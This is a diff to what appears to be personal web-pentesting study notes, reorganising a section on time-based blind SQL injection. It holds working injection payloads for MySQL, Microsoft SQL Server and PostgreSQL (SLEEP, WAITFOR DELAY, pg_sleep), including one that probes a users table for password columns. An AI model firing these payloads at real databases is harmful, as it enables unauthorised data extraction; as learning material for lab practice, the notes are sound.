@@ -24,6 +24,7 @@
       - [binary](#binary)
         - [sqlmap](#sqlmap)
         - [Provoking errors](#provoking-errors)
+      - [Time](#time)
 - [burpsuite](#burpsuite)
   - [Repeater](#repeater)
   - [Intruder](#intruder)
@@ -291,17 +292,18 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
     - case = true ==> error will be produced
     - TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = TRUE ==> produce error that is processed by the query
 
-- time
-  - with sleep() ==> success if the function is executed
-  - admin123' UNION SELECT SLEEP(5),1,x,y,z;--
-  - similar to blind
-  - admin123' UNION SELECT 1,SLEEP(5) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME!='username';--
+#### Time
+- with sleep() ==> success if the function is executed
+- admin123' UNION SELECT SLEEP(5),1,x,y,z;--
+- similar to blind
+- admin123' UNION SELECT 1,SLEEP(5) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME!='username';--
   
-  - Microsoft: 
-    - '; IF (1=2) WAITFOR DELAY '0:0:10'-- = false, will springt action
-    - '; IF (1=1) WAITFOR DELAY '0:0:10'-- = true, action
+- Microsoft: 
+ - '; IF (1=2) WAITFOR DELAY '0:0:10'-- = false, will springt action
+ - '; IF (1=1) WAITFOR DELAY '0:0:10'-- = true, action
 
-
+- PostgreSQL:
+  - ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
 
 
 - in the intruder: substring method with password list
